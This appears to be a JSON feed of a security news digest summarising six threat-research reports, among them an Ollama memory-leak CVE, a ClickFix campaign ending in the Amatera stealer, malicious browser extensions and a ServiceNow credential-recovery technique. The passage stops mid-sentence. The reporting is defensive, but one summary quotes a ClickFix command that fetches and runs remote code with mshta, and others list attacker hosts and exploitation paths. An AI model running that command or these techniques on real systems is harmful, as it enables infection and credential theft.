<script type="application/json" id="dl-articles">[{"n":12,"title":"Bleeding Llama: Critical Unauthenticated Memory Leak in Ollama","source":"cyera.com","sourceColorIdx":9,"link":"https://www.cyera.com/research/bleeding-llama-critical-unauthenticated-memory-leak-in-ollama","time":"00:14","priority":"MUST READ","score":94,"tldr":"Researchers disclosed CVE-2026-7482, a critical unauthenticated Ollama flaw that lets attackers leak process memory through crafted GGUF model uploads and exfiltrate it via the push API. The exposed memory can include user prompts, system prompts, and environment variables, putting internet-exposed Ollama servers at severe risk.","briefOverview":"\u003cp\u003eResearchers discovered CVE-2026-7482, a critical unauthenticated vulnerability in Ollama with a CVSS score of 9.1. Ollama is an open-source platform used to run large language models locally, and the article says it has roughly 170,000 GitHub stars, over 100 million Docker Hub downloads, and wide enterprise adoption. The researchers state that the flaw can leak the entire Ollama process memory, including user messages, system prompts, and environment variables.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability is tied to how Ollama creates models from uploaded GGUF files through the /api/create endpoint. A crafted GGUF file can declare a tensor shape with far more elements than the actual data contains, and Ollama does not validate that the declared element count matches the real data size before conversion. During F16-to-F32 conversion, the code reads beyond the end of the tensor buffer, causing an out-of-bounds heap read that can place nearby process memory into the newly created model file.\u003c/p\u003e\n\n\u003cp\u003eThe article describes an exfiltration path using Ollama’s /api/push endpoint. An attacker can create a model with a name formatted like an HTTP URI and then push that model to an attacker-controlled server, sending the model file containing leaked heap data. The researchers say roughly 300,000 exposed Ollama servers may be affected because Ollama listens on all interfaces by default with no authentication, creating risk for enterprises whose users send sensitive prompts, proprietary code, customer contracts, API keys, or tool outputs through Ollama.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["Researchers discovered CVE-2026-7482, a critical unauthenticated vulnerability in Ollama with a CVSS score of 9.1 that can leak the entire Ollama process memory.","The flaw occurs during model creation from uploaded GGUF files when a crafted tensor shape causes an out-of-bounds heap read during F16-to-F32 conversion.","Attackers can create a model with a controlled HTTP URI as its name and then use Ollama’s /api/push endpoint to upload the resulting model file containing leaked memory to their own server.","The leaked memory shown in the article included user prompts, system prompts from other models, and environment variables from the machine running the Ollama server.","The article states that roughly 300,000 internet-exposed Ollama servers may be affected because Ollama listens on all interfaces by default with no authentication."],"insights":["The vulnerability exists in a Go application because Ollama uses Go’s unsafe package in the GGUF tensor conversion path, bypassing the language’s normal memory-safety protections.","The article highlights that choosing F16 as the source format and F32 as the requested output format preserves leaked heap data because that conversion is lossless and avoids a second destructive quantization step.","The exfiltration path does not require a separate file-download feature because Ollama’s model name validation allows a model created from uploaded files to be named as an HTTP URI and then pushed to an attacker-controlled server.","The bug is triggered by trusting tensor shape metadata in a user-supplied GGUF file without verifying that the declared element count matches the actual amount of tensor data present.","The disclosure timeline shows the fix was available before public CVE publication, but the researcher warned that releasing it without clearly labeling it as a security patch could leave users unaware of the urgency."],"referencedReports":[],"body":"\u003cp\u003eResearchers discovered CVE-2026-7482, a critical unauthenticated vulnerability in Ollama with a CVSS score of 9.1. Ollama is an open-source platform used to run large language models locally, and the article says it has roughly 170,000 GitHub stars, over 100 million Docker Hub downloads, and wide enterprise adoption. The researchers state that the flaw can leak the entire Ollama process memory, including user messages, system prompts, and environment variables.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability is tied to how Ollama creates models from uploaded GGUF files through the /api/create endpoint. A crafted GGUF file can declare a tensor shape with far more elements than the actual data contains, and Ollama does not validate that the declared element count matches the real data size before conversion. During F16-to-F32 conversion, the code reads beyond the end of the tensor buffer, causing an out-of-bounds heap read that can place nearby process memory into the newly created model file.\u003c/p\u003e\n\n\u003cp\u003eThe article describes an exfiltration path using Ollama’s /api/push endpoint. An attacker can create a model with a name formatted like an HTTP URI and then push that model to an attacker-controlled server, sending the model file containing leaked heap data. The researchers say roughly 300,000 exposed Ollama servers may be affected because Ollama listens on all interfaces by default with no authentication, creating risk for enterprises whose users send sensitive prompts, proprietary code, customer contracts, API keys, or tool outputs through Ollama.\u003c/p\u003e\n"},{"n":4,"title":"EtherHiding in the Browser: ClickFix Chain Ends in Amatera","source":"netskope.com","sourceColorIdx":2,"link":"https://www.netskope.com/blog/etherhiding-in-the-browser-clickfix-chain-ends-in-amatera","time":"14:59","priority":"MUST READ","score":92,"tldr":"Netskope researchers detail a WordPress mass-compromise campaign that uses persistent browser Service Workers and EtherHiding via a Base smart contract to deliver a ClickFix fake reCAPTCHA chain ending in the Amatera password stealer. The key takeaway is that defenders must remediate beyond the infected site by purging malicious Service Workers and monitoring/blocking the on-chain and network infrastructure used to rotate payloads.","briefOverview":"\u003cp\u003eNetskope Threat Labs tracked a WordPress mass-compromise campaign affecting hundreds of sites. A rogue must-use plugin registers a malicious Service Worker in visitors’ browsers, where it strips Content-Security-Policy headers and injects a script. That script reads its payload from a smart contract on Base, which serves a fake reCAPTCHA that tells Windows visitors to paste and run a command.\u003c/p\u003e\n\n\u003cp\u003eThe campaign combines Service Worker persistence, EtherHiding, fake reCAPTCHA, ClickFix, an MP3/HTA polyglot, mshta abuse, fileless PowerShell, an image-hidden loader, reflective loading, and the Amatera password stealer. Netskope says it had not seen a Service Worker resolve its payload from a smart contract before. The design leaves few durable artifacts, with no stable file, server, or download for defenders to inspect or seize.\u003c/p\u003e\n\n\u003cp\u003eThe infection chain ultimately delivers Amatera, which beacons to gw.proxyvector[.]cc over TLS and resolves that host through DNS-over-HTTPS to dns.google and cloudflare-dns.com. The article says the stealer collects credentials and system data and exfiltrates them, and also installs a root certificate on the host. Netskope recommends blocking the beacon and stage-2 host, explicitly purging Service Workers during remediation, and monitoring the Base contract for payload rotation.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["Netskope Threat Labs tracked a WordPress mass-compromise campaign affecting hundreds of sites where a rogue must-use plugin registers a malicious Service Worker in visitors’ browsers.","The Service Worker strips Content-Security-Policy headers from HTML responses, injects a script that reads payloads from a Base smart contract, and persists in the browser until explicitly unregistered.","The on-chain payload delivers a fake Google reCAPTCHA ClickFix prompt that copies the command `mshta http://timelevel12[.]com/big` to the Windows visitor’s clipboard and instructs them to run it.","The infection chain uses an MP3/HTA polyglot, scheduled task, fileless PowerShell stage, Emmenhtal loader, steganographic image payload, reflective loading, and ultimately the Amatera password stealer.","Netskope recommends blocking the beacon and stage-2 host, explicitly purging Service Workers during remediation, and monitoring the Base contract for payload rotation."],"insights":["The campaign deliberately avoids showing the fake reCAPTCHA to logged-in WordPress users, `/wp-admin`, `/wp-login.php`, and visitors with the operator’s `nc_skip=1` cookie, shielding site administrators from the visible signs of compromise.","Netskope reported that it had not previously seen a Service Worker resolve its payload from a smart contract, making the combination of browser persistence and on-chain payload delivery a notable addition to known delivery methods.","The operator can recover from takedowns by writing a new downstream host value to the Base smart contract, as seen when `timelevel12[.]com` stopped resolving but the on-chain method allowed rotation to a fresh stage-2 host.","The campaign has two delivery lanes, but both share the same Base contract, `ultraspeed[.]pro/collect` beacon, on-chain scripts, and runtime logic, which tied them together as one campaign.","The article emphasizes that remediation must include explicitly unregistering the malicious Service Worker and deleting its caches, because server-side cleanup alone does not remove the browser-resident component."],"referencedReports":[{"title":"Unveiling ErrTraffic: Inside a Growing ClickFix Malware Distribution Framework","url":"https://blog.sekoia.io/unveiling-errtraffic-inside-a-growing-clickfix-malware-distribution-framework","publisher":"Sekoia","context":"The article cites Sekoia’s in-depth profile of the ErrTraffic Malware-as-a-Service ecosystem as background for the WordPress compromise pattern.","category":"research","primary":false},{"title":"Abusing the Service Workers API","url":"https://www.akamai.com/blog/security/abusing-the-service-workers-api","publisher":"Akamai","context":"The article references Akamai’s documentation of Service Worker API abuse as prior research on browser-based persistence.","category":"research","primary":false},{"title":"Hijacking Service Workers via DOM Clobbering","url":"https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering","publisher":"PortSwigger","context":"The article cites PortSwigger’s research showing that a hijacked Service Worker can defeat Content-Security-Policy.","category":"research","primary":false},{"title":"Current ClickFix Threat Landscape Developments","url":"https://rhisac.org/threat-intelligence/current-clickfix-threat-landscape-developments/","publisher":"RH-ISAC","context":"The article cites RH-ISAC’s landscape reporting to support that ClickFix use as an initial-access method has grown sharply.","category":"research","primary":false},{"title":"WebDAV as a Service: Uncovering the Infrastructure Behind Emmenhtal Loader Distribution","url":"https://blog.sekoia.io/webdav-as-a-service-uncovering-the-infrastructure-behind-emmenhtal-loader-distribution/","publisher":"Sekoia","context":"The article links to Sekoia’s analysis of the Emmenhtal loader when describing the campaign’s stage-3 loader.","category":"research","primary":false},{"title":"Amatera Stealer: Rebranded ACR Stealer with Improved Evasion Sophistication","url":"https://www.proofpoint.com/us/blog/threat-insight/amatera-stealer-rebranded-acr-stealer-improved-evasion-sophistication","publisher":"Proofpoint","context":"The article cites Proofpoint’s identification of Amatera as a rebrand of ACR Stealer, also known as AcridRain.","category":"research","primary":false}],"body":"\u003cp\u003eNetskope Threat Labs tracked a WordPress mass-compromise campaign affecting hundreds of sites. A rogue must-use plugin registers a malicious Service Worker in visitors’ browsers, where it strips Content-Security-Policy headers and injects a script. That script reads its payload from a smart contract on Base, which serves a fake reCAPTCHA that tells Windows visitors to paste and run a command.\u003c/p\u003e\n\n\u003cp\u003eThe campaign combines Service Worker persistence, EtherHiding, fake reCAPTCHA, ClickFix, an MP3/HTA polyglot, mshta abuse, fileless PowerShell, an image-hidden loader, reflective loading, and the Amatera password stealer. Netskope says it had not seen a Service Worker resolve its payload from a smart contract before. The design leaves few durable artifacts, with no stable file, server, or download for defenders to inspect or seize.\u003c/p\u003e\n\n\u003cp\u003eThe infection chain ultimately delivers Amatera, which beacons to gw.proxyvector[.]cc over TLS and resolves that host through DNS-over-HTTPS to dns.google and cloudflare-dns.com. The article says the stealer collects credentials and system data and exfiltrates them, and also installs a root certificate on the host. Netskope recommends blocking the beacon and stage-2 host, explicitly purging Service Workers during remediation, and monitoring the Base contract for payload rotation.\u003c/p\u003e\n"},{"n":13,"title":"19 Chrome and Edge Extensions Deliver a Wallet Drainer and Credential-Stealing Payloads","source":"socket.dev","sourceColorIdx":2,"link":"https://socket.dev/blog/chrome-edge-extension-wallet-drainer?utm_medium=feed","time":"16:01","priority":"MUST READ","score":92,"tldr":"Socket researchers found 19 malicious Chrome and Edge extensions, including several acquired from legitimate developers, that auto-updated users into an extensible malware framework for wallet draining, credential theft, session hijacking, and browser-history exfiltration. The campaign’s biggest risk is that trusted extensions with existing user bases can be quietly weaponized through normal browser update mechanisms.","briefOverview":"\u003cp\u003eSocket Threat Research identified 18 Chrome extensions and 1 Edge extension that shared malicious code patterns and malware operation techniques. The malicious versions were published in the last six months, but the campaign shows similarities to activity reported by DomainTools dating back to February 2024 and later described by Secure Annex. The extensions included SEO stats checkers, crypto price monitors, screen search utilities, and ad spying tools.\u003c/p\u003e\n\n\u003cp\u003eThe extensions followed a pattern in which an initial clean version provided the advertised functionality, and a later version introduced malicious behavior. Fourteen of the extensions were created by the threat actor, while five were legitimate extensions acquired from their original authors and then weaponized. The “Enable Right Click \u0026amp; Copy — Smart Unlock + OCR” Chrome extension had around 70,000 users when malicious functionality was introduced, and the related Edge extension had around 10,000 users, creating a potential exposure surface of 80,000 users.\u003c/p\u003e\n\n\u003cp\u003eThe malware framework created communication with command-and-control servers, stored downloaded JavaScript modules in Chrome extension local storage, stripped Content Security Policy headers from visited pages, and injected malicious code into websites through hidden page elements. Observed modules included multi-chain wallet draining, hardware-wallet seed-phrase phishing, exchange and wallet account harvesting, universal credential and form grabbing, social-media theft, browser-history exfiltration, and fake browser-update lures. The article states that the framework supports command-and-control rotation and separate exfiltration channels, helping the campaign remain operational even after infrastructure is discovered or disrupted.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["Socket identified 18 Chrome extensions and 1 Edge extension published with malicious versions in the last six months, all sharing similar code and malware operation techniques.","The extensions first shipped clean functionality and later introduced malicious behavior, with 14 created by the threat actor and 5 acquired from legitimate authors.","The “Enable Right Click \u0026 Copy — Smart Unlock + OCR” Chrome extension had about 70,000 users when malicious functionality was introduced, while the related Edge version had about 10,000 users and was still active at the time of writing.","The malware framework establishes command-and-control communication, stores downloaded JavaScript modules in browser extension local storage, strips Content Security Policy headers, and injects code into visited websites.","Observed malicious modules included multi-chain wallet draining, hardware-wallet seed-phrase phishing, exchange and wallet account harvesting, universal form grabbing, social-media theft, browser-history exfiltration, and fake browser-update lures."],"insights":["The campaign’s most impactful tactic is acquiring legitimate extensions with existing users, because Chrome’s default extension settings automatically update installed extensions at startup and periodically every few hours.","Users are not notified when browser extension ownership changes, which leaves them unaware when a previously trusted extension has moved to a higher-risk owner.","The malware separates its core loading framework from its downloadable malicious modules, allowing the operators to change payloads over time while keeping the same underlying delivery system.","The framework supports command-and-control rotation and separate per-victim exfiltration channels, which helps the campaign remain operational after parts of its infrastructure are discovered or disrupted.","The Edge version of the acquired right-click extension was still active and serving malware at the time of writing, even after the Chrome version had already been removed from the Chrome Web Store."],"referencedReports":[{"title":"Hidden Threats of Dual-Function Malware Found in Chrome Extensions","url":"https://dti.domaintools.com/research/hidden-threats-of-dual-function-malware-found-in-chrome-extensions","publisher":"DomainTools","context":"The article says the newly identified extensions share similarities with a campaign initially reported by DomainTools in February 2024.","category":"research","primary":false},{"title":"Pixel Perfect","url":"https://annex.security/blog/pixel-perfect/","publisher":"Secure Annex","context":"The article says malware from the same campaign was previously described in a research investigation by Secure Annex.","category":"research","primary":false}],"body":"\u003cp\u003eSocket Threat Research identified 18 Chrome extensions and 1 Edge extension that shared malicious code patterns and malware operation techniques. The malicious versions were published in the last six months, but the campaign shows similarities to activity reported by DomainTools dating back to February 2024 and later described by Secure Annex. The extensions included SEO stats checkers, crypto price monitors, screen search utilities, and ad spying tools.\u003c/p\u003e\n\n\u003cp\u003eThe extensions followed a pattern in which an initial clean version provided the advertised functionality, and a later version introduced malicious behavior. Fourteen of the extensions were created by the threat actor, while five were legitimate extensions acquired from their original authors and then weaponized. The “Enable Right Click \u0026amp; Copy — Smart Unlock + OCR” Chrome extension had around 70,000 users when malicious functionality was introduced, and the related Edge extension had around 10,000 users, creating a potential exposure surface of 80,000 users.\u003c/p\u003e\n\n\u003cp\u003eThe malware framework created communication with command-and-control servers, stored downloaded JavaScript modules in Chrome extension local storage, stripped Content Security Policy headers from visited pages, and injected malicious code into websites through hidden page elements. Observed modules included multi-chain wallet draining, hardware-wallet seed-phrase phishing, exchange and wallet account harvesting, universal credential and form grabbing, social-media theft, browser-history exfiltration, and fake browser-update lures. The article states that the framework supports command-and-control rotation and separate exfiltration channels, helping the campaign remain operational even after infrastructure is discovered or disrupted.\u003c/p\u003e\n"},{"n":1,"title":"A Valid DKIM Signature Over an Unauthorized Message","source":"ironscales.com","sourceColorIdx":9,"link":"https://ironscales.com/threat-intelligence/tenant-resigning-launders-failed-origin-hop-nested-eml-qr-phish","time":"11:00","priority":"SHOULD READ","score":82,"tldr":"A phishing email passed SPF, DKIM, DMARC, and Microsoft composite authentication because it was accepted and re-signed by a real Microsoft 365 tenant after an unauthenticated origin hop had failed authentication. The case shows that clean email authentication proves custody by trusted infrastructure, not that the message was authorized or safe.","briefOverview":"\u003cp\u003eA senior executive at a mid-size food and beverage products company received a phishing email that passed SPF, DKIM, DMARC, and Microsoft composite authentication. The message had an empty outer body except for a banner image and Microsoft’s first-contact notice, while its payload was an attached message file named \u003ccode\u003eEarnings_Adjustment.eml\u003c/code\u003e. The subject referred to a quarterly earnings reconciliation and benefits update, and the attachment received a clean antivirus verdict.\u003c/p\u003e\n\n\u003cp\u003eThe article’s main significance is that the same message had failed authentication at an earlier hop before being accepted into the claimed sending domain’s Microsoft 365 tenant. The original connection came from a host with no reverse DNS record, a Great Britain geolocation, and the HELO string \u003ccode\u003espeedy-negotiation\u003c/code\u003e; SPF failed, DKIM was absent, and DMARC failed. After the tenant relayed it outbound through Exchange Online, Microsoft-operated infrastructure applied a genuine DKIM signature and sent it from addresses authorized by the tenant’s SPF record.\u003c/p\u003e\n\n\u003cp\u003eThe attached \u003ccode\u003e.eml\u003c/code\u003e file rendered a fake internal HR compensation-update notice addressed to the recipient and included an embedded QR code. The QR code resolved to a Cloudflare-fronted subdomain of \u003ccode\u003egambiit[.]net\u003c/code\u003e with the recipient’s email address pre-filled as a query parameter, which the article describes as a credential-harvesting landing page. The article emphasizes that email authentication proved a real tenant handled the message, not that the tenant intended or authorized it, and recommends reading the earliest hop and ARC result set to see the original failing verdict.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["A senior executive at a mid-size food and beverage products company received a phishing email that passed SPF, DKIM, DMARC, and Microsoft composite authentication.","The message originally came from an unauthenticated host with no reverse DNS and the HELO string “speedy-negotiation,” where SPF failed, DKIM was absent, and DMARC failed.","The message was accepted into the claimed sending domain’s Microsoft 365 tenant and relayed outbound, where Exchange Online applied a valid DKIM signature and sent it from Microsoft-operated addresses authorized by the tenant’s SPF record.","The payload was an attached file named “Earnings_Adjustment.eml” that rendered a fake compensation-update notice with an embedded QR code leading to a credential-harvesting domain.","The article states that the consultancy whose tenant re-signed the message was a real business used without its knowledge and was a victim, not a participant."],"insights":["A clean SPF, DKIM, DMARC, and composite authentication result can reflect that a real tenant handled a message, while the same message’s earliest recorded hop can still show clear authentication failure.","The article emphasizes that ARC preserved the original failing authentication result, but the recipient’s clean pass came from a newly generated legitimate signature rather than from ARC trust.","The QR-code destination was not found by link extraction because it existed only as image data inside an HTML body inside an attached message file.","The article recommends reading the earliest hop and the ARC result set at index one because they can preserve evidence that is hidden beneath a clean final authentication result.","The quarantine action following detection was recorded with a status of error, even though the platform surfaced the message and a human analyst approved the call."],"referencedReports":[{"title":"Phishing Guidance: Stopping the Attack Cycle at Phase One","url":"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one","publisher":"CISA","context":"The article cites CISA's phishing guidance as supporting the idea that a clean authentication pass should be treated as evidence of message custody rather than intent or safety.","category":"guide","primary":false}],"body":"\u003cp\u003eA senior executive at a mid-size food and beverage products company received a phishing email that passed SPF, DKIM, DMARC, and Microsoft composite authentication. The message had an empty outer body except for a banner image and Microsoft’s first-contact notice, while its payload was an attached message file named \u003ccode\u003eEarnings_Adjustment.eml\u003c/code\u003e. The subject referred to a quarterly earnings reconciliation and benefits update, and the attachment received a clean antivirus verdict.\u003c/p\u003e\n\n\u003cp\u003eThe article’s main significance is that the same message had failed authentication at an earlier hop before being accepted into the claimed sending domain’s Microsoft 365 tenant. The original connection came from a host with no reverse DNS record, a Great Britain geolocation, and the HELO string \u003ccode\u003espeedy-negotiation\u003c/code\u003e; SPF failed, DKIM was absent, and DMARC failed. After the tenant relayed it outbound through Exchange Online, Microsoft-operated infrastructure applied a genuine DKIM signature and sent it from addresses authorized by the tenant’s SPF record.\u003c/p\u003e\n\n\u003cp\u003eThe attached \u003ccode\u003e.eml\u003c/code\u003e file rendered a fake internal HR compensation-update notice addressed to the recipient and included an embedded QR code. The QR code resolved to a Cloudflare-fronted subdomain of \u003ccode\u003egambiit[.]net\u003c/code\u003e with the recipient’s email address pre-filled as a query parameter, which the article describes as a credential-harvesting landing page. The article emphasizes that email authentication proved a real tenant handled the message, not that the tenant intended or authorized it, and recommends reading the earliest hop and ARC result set to see the original failing verdict.\u003c/p\u003e\n"},{"n":14,"title":"Open Directory Exposes Moobot Source Code and Ongoing Activity Post 2024 Court-Authorized Disruption","source":"censys.com","sourceColorIdx":5,"link":"https://censys.com/blog/open-directory-exposes-moobot-source-code-and-activity/","time":"19:58","priority":"SHOULD READ","score":82,"tldr":"Censys found an exposed open directory revealing Moobot botnet source code, active DDoS tooling, attack logs, and a fake Chinese identity verification service, showing the operation remains active despite a 2024 DOJ disruption. The leaked Moobot code includes dormant download-and-execute functionality that may explain how APT28 previously repurposed the botnet to deploy additional malware.","briefOverview":"\u003cp\u003eA misconfigured open directory on \u003ccode\u003e86.53.111[.]212:8080\u003c/code\u003e exposed source code for Moobot, a Mirai-derived DDoS botnet, along with other denial-of-service tools, attack records, and a fraudulent Chinese identity verification service. The article says Moobot was disrupted in a U.S. Department of Justice court-authorized operation in February 2024, but Censys observed linked Moobot activity continuing in August 2026. Censys identified one active Moobot C2 server at \u003ccode\u003e162.141.92[.]192\u003c/code\u003e and observed more than 500 short-duration attack taskings from it during August 2026.\u003c/p\u003e\n\n\u003cp\u003eThe recovered Moobot code contained known identifiers, including the \u003ccode\u003e0x336699\u003c/code\u003e C2 registration magic packet header and the seed \u003ccode\u003ew5q6he3dbrsgmclkiu4to18npavj702f\u003c/code\u003e. The source also included previously unknown dormant download-and-execute routines that could cause infected systems to request an architecture-specific ELF file from a hardcoded IP address, write it as executable, rename it, fork, and run it. The article describes this dormant functionality as the most plausible mechanism behind the previously reported repurposing of Moobot by APT28.\u003c/p\u003e\n\n\u003cp\u003eThe same exposed directory also contained \u003ccode\u003eStresD Pro+\u003c/code\u003e, a Node.js/Express DDoS panel with 16 registered accounts and 32 recorded attacks on the day of collection. The panel operated independently from Moobot by spawning a local Python script that generated Minecraft Bedrock Edition RakNet flood traffic directly from the staging host. A separate service on TCP/3000, branded as 公安身份核验系统, acted as a wrapper around a third-party Chinese identity lookup API and collected full identity documents through an embedded appeal flow.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["A misconfigured open directory on 86.53.111[.]212:8080 exposed Moobot botnet source code, additional denial-of-service tools with attack records, and a fraudulent identity verification service.","The recovered Moobot source included known Moobot identifiers and previously unknown dormant download-and-execute functionality that could allow a command-and-control operator to deploy arbitrary payloads to already-compromised devices if enabled.","The StresD Pro+ panel found in the same directory had 16 registered accounts and 32 recorded attacks on the day of collection, and it generated flood traffic directly from the staging host using a Minecraft Bedrock Edition RakNet flooder.","The fake 公安身份核验系统 service on TCP/3000 acted as a reseller wrapper around the third-party Chinese identity lookup API at api.cemg[.]xyz and collected full identity documents through an embedded appeal flow.","Censys observed one active Moobot command-and-control server linked to the operation at 162.141.92[.]192 and recorded more than 500 short-duration attack taskings from it during August 2026."],"insights":["The recovered StresD Pro+ logs show that the operator was monitoring their own customers by collecting client IPs, user agents, screen resolution, CPU core counts, browser fingerprints, and other device details when attacks were launched.","Although StresD Pro+ was hosted alongside Moobot source code, the article states it did not use the Moobot bot fleet and instead launched denial-of-service traffic directly from the local server through a Python Minecraft Bedrock Edition flooder.","The same username, password pattern, and 48-character admin key appeared in both the fake government verification service setup and StresD Pro+, linking the two services operationally on the exposed host.","The Moobot source included a Chinese build tutorial, which the article says indicates the source code may be distributed among multiple parties rather than controlled by a single operator.","Censys assesses the current Moobot activity as financially motivated and states it has no assessed nexus to state-sponsored activity, despite the earlier DOJ report that APT28 had repurposed Moobot at least once."],"referencedReports":[{"title":"DDoS Botnet Moobot","url":"https://blog.netlab.360.com/ddos-botnet-moobot-en/","publisher":"Netlab 360","context":"The article references Netlab 360’s 2019 analysis as the first discovery of Moobot and uses it to corroborate Moobot-specific source-code identifiers.","category":"research","primary":false},{"title":"Justice Department Conducts Court-Authorized Disruption of Botnet Controlled by the Russian Federation’s Main Intelligence Directorate of the General Staff (GRU)","url":"https://www.justice.gov/archives/opa/pr/justice-department-conducts-court-authorized-disruption-botnet-controlled-russian","publisher":"U.S. Department of Justice","context":"The article cites the DOJ release for the 2024 court-authorized disruption of Moobot and the statement that APT28 repurposed the botnet on at least one occasion.","category":"news","primary":false}],"body":"\u003cp\u003eA misconfigured open directory on \u003ccode\u003e86.53.111[.]212:8080\u003c/code\u003e exposed source code for Moobot, a Mirai-derived DDoS botnet, along with other denial-of-service tools, attack records, and a fraudulent Chinese identity verification service. The article says Moobot was disrupted in a U.S. Department of Justice court-authorized operation in February 2024, but Censys observed linked Moobot activity continuing in August 2026. Censys identified one active Moobot C2 server at \u003ccode\u003e162.141.92[.]192\u003c/code\u003e and observed more than 500 short-duration attack taskings from it during August 2026.\u003c/p\u003e\n\n\u003cp\u003eThe recovered Moobot code contained known identifiers, including the \u003ccode\u003e0x336699\u003c/code\u003e C2 registration magic packet header and the seed \u003ccode\u003ew5q6he3dbrsgmclkiu4to18npavj702f\u003c/code\u003e. The source also included previously unknown dormant download-and-execute routines that could cause infected systems to request an architecture-specific ELF file from a hardcoded IP address, write it as executable, rename it, fork, and run it. The article describes this dormant functionality as the most plausible mechanism behind the previously reported repurposing of Moobot by APT28.\u003c/p\u003e\n\n\u003cp\u003eThe same exposed directory also contained \u003ccode\u003eStresD Pro+\u003c/code\u003e, a Node.js/Express DDoS panel with 16 registered accounts and 32 recorded attacks on the day of collection. The panel operated independently from Moobot by spawning a local Python script that generated Minecraft Bedrock Edition RakNet flood traffic directly from the staging host. A separate service on TCP/3000, branded as 公安身份核验系统, acted as a wrapper around a third-party Chinese identity lookup API and collected full identity documents through an embedded appeal flow.\u003c/p\u003e\n"},{"n":7,"title":"Cleartext Credential Recovery in ServiceNow","source":"specterops.io","sourceColorIdx":1,"link":"https://specterops.io/blog/2026/08/27/cleartext-credential-recovery-servicenow/","time":"16:00","priority":"SHOULD READ","score":80,"tldr":"Researchers showed that privileged ServiceNow users can modify or create script includes to make the platform return cleartext Discovery and LDAP credentials, including passwords, SSH keys, cloud secrets, and service principal credentials. The technique requires significant roles such as discovery_admin or script_include_admin but expands known post-exploitation paths beyond credential coercion or relay.","briefOverview":"\u003cp\u003eThe article describes a ServiceNow credential recovery technique using script includes to return cleartext credentials to the client. The author focused on whether the server could be influenced to return decrypted Discovery credentials and secrets, particularly non-Windows credentials not covered by previously documented forced authentication and relay approaches. In the author’s test environment, the technique worked for all credential types stored in the \u003ccode\u003ediscovery_credentials\u003c/code\u003e table, including SSH private keys, Entra ID service principal secrets, and AWS keys.\u003c/p\u003e\n\n\u003cp\u003eFor Discovery credentials, the technique modifies the \u003ccode\u003eCredentialTestAjax\u003c/code\u003e script include used by the ServiceNow Test Credential workflow. The script include already decrypts credential data before passing it to credential validation logic, and introducing an early return caused decrypted values to be sent back in the HTTP response. The author states that using this path requires execute access to \u003ccode\u003eCredentialTestAjax\u003c/code\u003e, the ability to modify the relevant \u003ccode\u003esys_script_include\u003c/code\u003e record, and at least partial read access to \u003ccode\u003ediscovery_credentials\u003c/code\u003e, with \u003ccode\u003ediscovery_admin\u003c/code\u003e satisfying those requirements by default in the author’s environment.\u003c/p\u003e\n\n\u003cp\u003eThe article also covers LDAP credentials stored separately in \u003ccode\u003eldap_server_config\u003c/code\u003e records, where the password field uses ServiceNow’s \u003ccode\u003ePassword2\u003c/code\u003e data type. The author shows that a new script include can call \u003ccode\u003egetDecryptedValue()\u003c/code\u003e to return cleartext LDAP connection passwords from those records. The post concludes that this is another potential way an attacker with sufficient ServiceNow permissions could extract stored credentials, alongside previously documented ServiceNow post-exploitation techniques.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["The article describes a method for using ServiceNow script includes to retrieve cleartext values from Discovery credential records and LDAP credential records.","By modifying the CredentialTestAjax script include to return decrypted credential data early, the author was able to make the same AJAX request used by the Test Credential feature return cleartext credential values to the client.","In the author’s test environment, the Discovery credential retrieval method worked for all credential types stored in the discovery_credentials table, including SSH private keys, Entra ID service principal secrets, and AWS keys.","The article states that using the Discovery credential retrieval method requires execute access to CredentialTestAjax, the ability to modify the sys_script_include record, and at least partial read access to the discovery_credentials table, which discovery_admin satisfies by default in the author’s environment.","For LDAP credentials, the article shows that a script include can use getDecryptedValue() on Password2 fields in ldap_server_config records to return cleartext LDAP connection passwords, requiring the ability to create or modify and execute script includes."],"insights":["The same server-side script include used by the normal ServiceNow Test Credential workflow can be repurposed to expose decrypted Discovery credential data, because the decrypted object already exists inside the CredentialTestAjax code path before validation is performed.","The Discovery credential technique is not limited to credential types that expose a Test Credential button in the ServiceNow web interface; the author found it also worked for credential types such as SSH private keys, Entra ID service principal secrets, and AWS keys.","In the author’s environment, the discovery_admin role satisfied all stated requirements for Discovery credential recovery because it could execute CredentialTestAjax, modify sys_script_include through script_include_admin, and read discovery_credentials records.","The LDAP credential recovery path can require fewer privileges than the previously documented forced-authentication approach, because creating and executing a new script include required script_include_admin by default, while LDAPClientUtils execution required admin by default.","ServiceNow Password2 fields do not behave identically across credential storage locations in the author’s testing: getDecryptedValue() returned LDAP passwords from ldap_server_config, but did not return cleartext sensitive values from discovery_credentials."],"referencedReports":[{"title":"Red Teaming with ServiceNow","url":"https://www.mdsec.co.uk/2025/03/red-teaming-with-servicenow/","publisher":"MDSec","context":"The article recommends reading Tim Carrington’s MDSec blog first and repeatedly references its documented ServiceNow post-exploitation techniques as background for the new credential recovery method.","category":"research","primary":true}],"body":"\u003cp\u003eThe article describes a ServiceNow credential recovery technique using script includes to return cleartext credentials to the client. The author focused on whether the server could be influenced to return decrypted Discovery credentials and secrets, particularly non-Windows credentials not covered by previously documented forced authentication and relay approaches. In the author’s test environment, the technique worked for all credential types stored in the \u003ccode\u003ediscovery_credentials\u003c/code\u003e table, including SSH private keys, Entra ID service principal secrets, and AWS keys.\u003c/p\u003e\n\n\u003cp\u003eFor Discovery credentials, the technique modifies the \u003ccode\u003eCredentialTestAjax\u003c/code\u003e script include used by the ServiceNow Test Credential workflow. The script include already decrypts credential data before passing it to credential validation logic, and introducing an early return caused decrypted values to be sent back in the HTTP response. The author states that using this path requires execute access to \u003ccode\u003eCredentialTestAjax\u003c/code\u003e, the ability to modify the relevant \u003ccode\u003esys_script_include\u003c/code\u003e record, and at least partial read access to \u003ccode\u003ediscovery_credentials\u003c/code\u003e, with \u003ccode\u003ediscovery_admin\u003c/code\u003e satisfying those requirements by default in the author’s environment.\u003c/p\u003e\n\n\u003cp\u003eThe article also covers LDAP credentials stored separately in \u003ccode\u003eldap_server_config\u003c/code\u003e records, where 